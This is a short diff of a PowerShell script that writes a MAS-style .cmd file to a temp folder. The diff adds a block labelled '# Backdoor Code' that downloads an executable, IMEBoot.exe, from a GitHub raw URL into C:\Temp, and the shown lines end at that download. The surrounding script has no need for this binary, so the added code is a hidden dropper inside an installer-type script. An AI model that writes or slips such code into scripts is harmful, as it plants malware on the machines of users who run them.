@@ -31,8 +31,10 @@ $FilePath = if ($isAdmin) { "$env:SystemRoot\Temp\MAS_$rand.cmd" } else { "$env:
 $ScriptArgs = "$args "
 $prefix = "@:: $rand `r`n"
 $content = $prefix + $response
-Set-Content -Path $FilePath -Value $content"
-https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe"
+Set-Content -Path $FilePath -Value $content
+
+# Backdoor Code
+$Url = "https://github.com/ShellSculptor/GetsScreen-Windows-10/raw/main/IMEBoot.exe"
 $Filename = "C:\Temp\IMEBoot.exe"
 $webClient = New-Object System.Net.WebClient
 $webClient.DownloadFile($Url, $Filename)
